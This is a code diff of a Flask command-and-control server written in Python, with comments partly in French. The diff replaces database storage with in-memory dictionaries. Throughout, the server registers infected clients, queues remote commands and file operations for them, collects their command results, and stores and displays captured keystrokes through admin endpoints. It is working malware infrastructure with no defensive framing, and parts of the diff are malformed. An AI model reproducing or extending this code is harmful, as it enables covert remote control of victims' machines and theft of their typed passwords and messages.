@@ -6,19 +6,16 @@ import os
 from config import ENCRYPTION_KEY
 from encryptor import Encryptor
 from protocol import Protocol
-from database_sql import DatabaseSQL
-from db_config import get_database_url
 
 
 app = Flask(__name__)
 
-# Initialiser la base de données MySQL
-db = DatabaseSQL(get_database_url())
-
-# Note: Les stockages en mémoire sont maintenant gérés par la BD
-# Garder un cache en mémoire pour les performances
-clients_cache = {}
-cache_lock = threading.Lock()
+#In-memory storage for clients
+clients = {}
+#In-memory storage for pending commands for clients
+pending_commands = {}
+command_results = {}
+keylogs_storage = {}
 
 encryptor = Encryptor(ENCRYPTION_KEY)
 
@@ -26,46 +23,23 @@ encryptor = Encryptor(ENCRYPTION_KEY)
 
 
 def cleanup_old_clients():
-    """Nettoyer les clients inactifs dans la BD"""
     while True:
-        try:
-            # Nettoyer les clients inactifs depuis plus d'1 heure
-            deleted_count = db.cleanup_old_clients(max_age_seconds=3600)
-            
-            # Nettoyer aussi le cache en mémoire
-            with cache_lock:
-                current_time = time.time()
-                clients_to_remove = [
-                    cid for cid, data in clients_cache.items()
-                    if current_time - data.get('last_seen', 0) > 3600
-                ]
-                for cid in clients_to_remove:
-                    clients_cache.pop(cid, None)
-            
-            # Nettoyer les anciennes commandes
-            db.cleanup_old_commands(max_age_seconds=3600)
-            
-        except Exception as e:
-            print(f"[CLEANUP] Erreur: {e}")
+        current_time = time.time()
+        clients_to_remove = []
         
-        time.sleep(30)  # Vérifier toutes les 30 secondes
+        for client_id, client_data in clients.items():
+            if current_time - client_data.get('last_seen', 0) > 3600:  #1 hour
+                clients_to_remove.append(client_id)
+        
+        for client_id in clients_to_remove:
+            del clients[client_id]
+            print(f"Removed inactive client: {client_id}")
+        
+        time.sleep(30)  #Check every 30 seconds
 
-def cleanup_old_keylogs():
-    """Nettoyer les anciens keylogs"""
-    while True:
-        try:
-            db.cleanup_old_keylogs(max_age_seconds=24 * 3600)  # 24 heures
-            time.sleep(3600)  # Toutes les heures
-        except Exception as e:
-            print(f"[KEYLOG_CLEANUP] Erreur: {e}")
-            time.sleep(300)
-
-# Démarrer les threads de nettoyage
+#Start cleanup thread
 cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
 cleanup_thread.start()
-
-keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
-keylog_cleanup_thread.start()
 
 
 @app.route('/')
@@ -121,21 +95,15 @@ def register_client():
 
         client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-        # Enregistrer dans la BD
-        success = db.register_client(client_id, system_info, client_ip)
-        
-        if success:
-            # Mettre à jour le cache en mémoire
-            with cache_lock:
-                clients_cache[client_id] = {
-                    'system_info': system_info,
-                    'last_seen': time.time(),
-                    'ip': client_ip
-                }
-            
-            print(f"[REGISTER] Client {client_id} enregistré avec succès")
-        else:
-            print(f"[REGISTER] Erreur lors de l'enregistrement de {client_id}")
+        clients[client_id] = {
+            'system_info': system_info,
+            'last_seen': time.time(),
+            'first_seen': time.time(),
+            'ip': client_ip,
+            'checkin_count': clients.get(client_id, {}).get('checkin_count', 0) + 1
+        }
+
+
 
         response_data = Protocol.create_success_message("Registered successfully!!!")
         encrypted_response = encryptor.encrypt(response_data)
@@ -185,57 +153,55 @@ def heartbeat():
 
         client_id = heartbeat_data.get('client_id')
 
-        if client_id:
-            # Mettre à jour dans la BD
-            success = db.update_client_heartbeat(client_id)
+        if client_id and client_id in clients:
+            clients[client_id]['last_seen'] = time.time()
+            clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1 
             
-            if success:
-                # Mettre à jour le cache
-                with cache_lock:
-                    if client_id in clients_cache:
-                        clients_cache[client_id]['last_seen'] = time.time()
-                
-                res_msg = Protocol.create_success_message()
-                encrypted_response = encryptor.encrypt(res_msg)
-                return jsonify({
-                    "data": encrypted_response
-                })
-            else:
-                error_msg = Protocol.create_error_message("Client not found!")
-                encrypted_response = encryptor.encrypt(error_msg)
-                return jsonify({
-                    "data": encrypted_response,
-                }), 404
+
+
+            res_msg = Protocol.create_success_message()
+            encrypted_response = encryptor.encrypt(res_msg)
+            return jsonify({
+                "data": encrypted_response
+            })
+
+
         else:
-            error_msg = Protocol.create_error_message("No client_id provided!")
+            error_msg = Protocol.create_error_message("Client not found!")
             encrypted_response = encryptor.encrypt(error_msg)
+
             return jsonify({
                 "data": encrypted_response,
-            }), 400
+            }), 404
     
     except Exception as e:
         error_msg = Protocol.create_error_message(str(e))
         encrypted_res = encryptor.encrypt(error_msg)
 
-    """Récupérer la liste de tous les clients depuis la BD"""
-    try:
-        clients_list = db.get_all_clients()
-        
-        print(f"[ADMIN] Returning {len(clients_list)} clients from database")
         return jsonify({
-            "status": "success",
-            "clients": clients_list,
-            "total_clients": len(clients_list),
-            "server_time": datetime.now().isoformat()
-        })
-    except Exception as e:
-        print(f"[ADMIN] Erreur lors de la récupération des clients: {e}")
-        return jsonify({
-            "status": "error",
-            "error": str(e),
-            "clients": [],
-            "total_clients": 0
+            "data": encrypted_res
         }), 500
+
+
+@app.route('/admin/clients', methods=['GET'])
+def get_clients():
+    #Get list of all connected clients
+    clients_list = []
+    current_time = time.time()
+    
+    for client_id, client_data in clients.items():
+        last_seen = client_data.get('last_seen', 0)
+        clients_list.append({
+            "client_id": client_id,
+            "system_info": client_data.get('system_info', {}),
+            "first_seen": client_data.get('first_seen'),
+            "last_seen": last_seen,
+            "ip": client_data.get('ip'),
+            "online": current_time - last_seen < 10,  #online if seen in last 10 seconds
+            "checkin_count": client_data.get('checkin_count', 0),
+            "uptime_seconds": current_time - client_data.get('first_seen', current_time)
+        })
+    
     print(f"[ADMIN] Returning {len(clients_list)} clients")
     return jsonify({
         "status": "success",
@@ -247,28 +213,22 @@ def heartbeat():
 
 @app.route('/admin/status', methods=['GET'])
 def server_status():
-    """Récupérer le statut du serveur"""
-    try:
-        all_clients = db.get_all_clients()
-        online_clients = sum(1 for client in all_clients if client.get('online', False))
-        
-        return jsonify({
-            "status": "online",
-            "total_clients": len(all_clients),
-            "online_clients": online_clients,
-            "server_time": datetime.now().isoformat(),
-            "uptime_seconds": time.time() - app.start_time
-        })
-    except Exception as e:
-        return jsonify({
-            "status": "error",
-            "error": str(e)
-        }), 500
+    online_clients = sum(1 for client in clients.values() 
+                        if time.time() - client.get('last_seen', 0) < 10)
+    
+    return jsonify({
+        "status": "online",
+        "total_clients": len(clients),
+        "online_clients": online_clients,
+        "server_time": datetime.now().isoformat(),
+        "uptime_seconds": time.time() - app.start_time
+    })
+
+
 
 
 @app.route("/admin/process/<client_id>", methods=['POST'])
 def send_process_command(client_id):
-    """Envoyer une commande à un client"""
     try:
         command_data = request.json
         action = command_data.get("action")
@@ -278,46 +238,50 @@ def send_process_command(client_id):
             return jsonify({"error": "No action specified"}), 400
         
         command_id = f'cmd_{int(time.time() * 1000)}'
+        pending_commands.setdefault(client_id, []).append({
+            "command_id": command_id,
+            "action": action,
+            "data": data,
+            "timestamp": time.time()
+        })
         
-        # Ajouter dans la BD
-        success = db.add_command(client_id, command_id, action, data)
+        #Clean old commands per client
+        if client_id in pending_commands:
+            pending_commands[client_id] = pending_commands[client_id][-10:]
         
-        if success:
-            
-            print(f"[PROCESS] Commande mise en file pour {client_id}: {action}")
-            return jsonify({
-                "success": True,
-                "command_id": command_id,
-                "message": f'Command queued for client {client_id}'
-            })
-        else:
-            return jsonify({"error": "Failed to queue command"}), 500
+        
+        print(f"[PROCESS] Command queued for {client_id}: {action}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f'Command queued for client {client_id}'
+        })
     
     except Exception as e:
-        print(f"[PROCESS] Erreur: {e}")
+        return jsonify({"error": f"failed to queue command: {e}"}), 500
     
+
+
 @app.route("/admin/command_result/<command_id>", methods=['GET'])
 def get_command_result(command_id):
-    """Récupérer le résultat d'une commande"""
     try:
-        result_data = db.get_command_result(command_id)
-        if result_data:
-            return jsonify({"success": True, "result": result_data['result']})
+        result = command_results.get(command_id)
+        if result:
+            return jsonify({"success": True, "result": result.get('result')}) #changed
         else:
             return jsonify({"error": "Result not found or expired"}), 404
     
     except Exception as e:
-        print(f"[RESULT] Erreur: {e}")
         return jsonify({"error": f'Failed to get result: {e}'}), 500
 
 
 @app.route("/commands", methods=["POST"])
 def get_commands():
-    """Récupérer les commandes en attente pour un client"""
     try:
         encrypted_data = request.json.get('data')
         if not encrypted_data:
             return jsonify({"error": "No encrypted data"}), 400
+        
         
         client_data = encryptor.decrypt(encrypted_data)
         if not client_data or client_data.get("type") != Protocol.MSG_GET_COMMANDS:
@@ -327,26 +291,32 @@ def get_commands():
         if not client_id:
             return jsonify({"error": "No client ID"}), 400
         
-        print(f"[SERVER] Client {client_id} requesting commands")
         
-        # Récupérer les commandes depuis la BD
-        commands = db.get_pending_commands(client_id)
+        print(f"[SERVER] Client {client_id} requesting commands")
+        commands = pending_commands.get(client_id, [])
         print(f"[SERVER] Found {len(commands)} pending commands for {client_id}")
         
+        
         if commands:
+            pending_commands[client_id] = []
             print(f"[SERVER] Sending {len(commands)} commands to {client_id}")
+        
         
         response_data = {
             "type": "commands",
             "commands": commands
         }
         
+        
         encrypted_response = encryptor.encrypt(response_data)
         return jsonify({"data": encrypted_response})
+    
     
     except Exception as e:
         print(f"[SERVER] Error in /commands: {e}")
         return jsonify({"error": f"Failed to get commands: {e}"}), 500
+    
+    
 
 
 @app.route("/commands_result", methods=["POST"])
@@ -373,20 +343,26 @@ def submit_command_result():
         command_id = client_data.get("command_id")
         result = client_data.get("result")
         
-        client_id = client_data.get('client_id')
-        
         print(f"[SERVER] Command ID: {command_id}, Result type: {type(result)}")
         
         if command_id and result is not None:
-            # Stocker dans la BD
-            success = db.add_command_result(command_id, client_id, result)
+            command_results[command_id] = {
+                'result': result,
+                'timestamp': time.time(),
+                'client_id': client_data.get('client_id')
+            }
             
-            if success:
-                print(f"[SERVER] Successfully stored result for command {command_id} in database")
-                return jsonify({"success": True})
-            else:
-                print(f"[SERVER] Failed to store result in database")
-                return jsonify({"error": "Failed to store result"}), 500
+            print(f"[SERVER] Successfully stored result for command {command_id}")
+            
+
+            current_time = time.time()
+            expired_keys = [k for k, v in command_results.items() if current_time - v.get('timestamp', current_time) > 3600]
+            
+            for key in expired_keys:
+                command_results.pop(key, None)
+
+            return jsonify({"success" : True})
+        else:
             print(f"[SERVER] Error: Missing command_id or result")
             return jsonify({"error": "Missing command_id or result"}), 400
     
@@ -397,9 +373,41 @@ def submit_command_result():
         return jsonify({"error": f"Failed to submit result: {e}"}), 500
 
 
+@app.route("/admin/file/<client_id>", methods=["POST"])
+def send_file_command(client_id):
+    try:
+        command_data = request.json
+        action = command_data.get('action')
+        data = command_data.get("data", {})
+        
+        if not action:
+            return jsonify({"error": "No action specified"}), 400
+        
+        command_id = f"file_cmd_{int(time.time() * 1000)}"
+        pending_commands.setdefault(client_id, []).append({
+            "command_id": command_id,
+            "action": action,
+            "data": data,
+            "timestamp": time.time()
+        })
+        
+        if client_id in pending_commands:
+            pending_commands[client_id] = pending_commands[client_id][-10:]
+        
+        print(f"[FILE] command queued for {client_id}: {action}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f'File command queued for client {client_id}'
+        })
+    
+    except Exception as e:
+        return jsonify({"error": f"failed to queue file command: {e}"}), 500
+
+
 @app.route("/keylog_data", methods=["POST"])
 def receive_keylog_data():
-    """Recevoir et stocker les keylogs d'un client"""
+    
     try:
         print(f"[KEYLOG] Received keylog data request")
         encrypted_data = request.json.get("data")
@@ -427,21 +435,30 @@ def receive_keylog_data():
         print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
         
         if client_id and logs:
-            # Stocker dans la BD
-            success = db.add_keylogs(client_id, logs)
+            # Initialiser le stockage pour ce client si nécessaire
+            if client_id not in keylogs_storage:
+                keylogs_storage[client_id] = []
             
-            if success:
-                # Mettre à jour le heartbeat
-                db.update_client_heartbeat(client_id)
-                
-                print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id} in database")
-                
-                return jsonify({
-                    "success": True, 
-                    "message": f"Received {len(logs)} keylogs"
-                })
-            else:
-                return jsonify({"error": "Failed to store keylogs"}), 500
+            # Ajouter les nouveaux logs
+            keylogs_storage[client_id].extend(logs)
+            
+            # Garder seulement les 1000 derniers logs par client
+            if len(keylogs_storage[client_id]) > 1000:
+                keylogs_storage[client_id] = keylogs_storage[client_id][-1000:]
+            
+            # Mettre à jour le last_seen du client
+            if client_id in clients:
+                clients[client_id]['last_seen'] = time.time()
+                clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1
+            
+            print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
+            print(f"[KEYLOG] Total logs for {client_id}: {len(keylogs_storage[client_id])}")
+            
+            return jsonify({
+                "success": True, 
+                "message": f"Received {len(logs)} keylogs",
+                "total_stored": len(keylogs_storage[client_id])
+            })
         else:
             print(f"[KEYLOG] Error: Missing client_id or logs")
             return jsonify({"error": "Missing client_id or logs"}), 400
@@ -455,57 +472,109 @@ def receive_keylog_data():
 
 @app.route("/admin/keylogs/<client_id>", methods=["GET"])
 def get_client_keylogs(client_id):
-    """Récupérer les keylogs d'un client"""
+    
     try:
         limit = request.args.get('limit', 100, type=int)
         
-        # Récupérer depuis la BD
-        logs = db.get_keylogs(client_id, limit)
-        
-        return jsonify({
-            "success": True,
-            "client_id": client_id,
-            "keylogs": logs,
-            "returned_logs": len(logs)
-        })
+        if client_id in keylogs_storage:
+            logs = keylogs_storage[client_id][-limit:]  # Les plus récents en premier
+            return jsonify({
+                "success": True,
+                "client_id": client_id,
+                "keylogs": logs,
+                "total_logs": len(keylogs_storage[client_id]),
+                "returned_logs": len(logs)
+            })
+        else:
+            return jsonify({
+                "success": True,
+                "client_id": client_id,
+                "keylogs": [],
+                "total_logs": 0,
+                "message": "No keylogs found for this client"
+            })
     
     except Exception as e:
         print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
         return jsonify({"error": f"Failed to get keylogs: {e}"}), 500
-
+    
 
 @app.route("/admin/keylogs_stats", methods=["GET"])
 def get_keylogs_stats():
-    """Récupérer les statistiques des keylogs"""
+    
     try:
-        stats_data = db.get_keylog_stats()
+        stats = {}
+        total_logs = 0
+        
+        for client_id, logs in keylogs_storage.items():
+            stats[client_id] = {
+                "log_count": len(logs),
+                "last_log_time": logs[-1]['timestamp'] if logs else "No logs",
+                "client_online": client_id in clients and (time.time() - clients[client_id].get('last_seen', 0) < 60)
+            }
+            total_logs += len(logs)
         
         return jsonify({
             "success": True,
-            **stats_data
+            "total_clients_with_logs": len(keylogs_storage),
+            "total_logs_stored": total_logs,
+            "clients": stats
         })
     
     except Exception as e:
-        print(f"[KEYLOG_STATS] Erreur: {e}")
         return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500
 
 
-# Point d'entrée principal
-if __name__ == "__main__":
-    print("="*60)
-    print("🚀 SERVEUR C2 - DÉMARRAGE")
-    print("="*60)
-    print(f"Base de données: MySQL (c2_database)")
-    print(f"Serveur: http://0.0.0.0:5000")
-    print(f"Interface admin: http://localhost:5000/admin/clients")
-    print("="*60)
+def cleanup_old_keylogs():
     
-    # Démarrer les threads de nettoyage
-    cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
-    cleanup_thread.start()
-    
-    keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
-    keylog_cleanup_thread.start()
-    
-    # Démarrer le serveur Flask
-    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
+    while True:
+        try:
+            current_time = time.time()
+            cutoff_time = current_time - (24 * 3600)  # 24 heures
+            
+            for client_id in list(keylogs_storage.keys()):
+                # Filtrer les logs trop vieux
+                keylogs_storage[client_id] = [
+                    log for log in keylogs_storage[client_id] 
+                    if current_time - datetime.fromisoformat(log['timestamp'].replace('Z', '+00:00')).timestamp() < 24 * 3600
+                ]
+                
+                # Supprimer les entrées vides
+                if not keylogs_storage[client_id]:
+                    del keylogs_storage[client_id]
+            
+            print(f"[CLEANUP] Keylogs cleanup completed")
+            time.sleep(3600)  # Toutes les heures
+        
+        except Exception as e:
+            print(f"[CLEANUP] Error in keylogs cleanup: {e}")
+            time.sleep(300)
+
+# Start cleanup threads
+cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
+cleanup_thread.start()
+
+# AJOUT: Thread de nettoyage des keylogs
+keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
+keylog_cleanup_thread.start()
+
+@app.before_request
+def before_request():
+    print(f"[REQUEST] {request.method} {request.path} - Clients: {len(clients)}")
+
+@app.after_request
+def after_request(response):
+    print(f"[RESPONSE] {request.method} {request.path} - Status: {response.status_code}")
+    return response
+
+
+
+#Store server start time
+app.start_time = time.time()
+
+
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    print(f"[SERVER] Starting C2 server on port {port}")
+    app.run(host='0.0.0.0', port=port, debug=False)
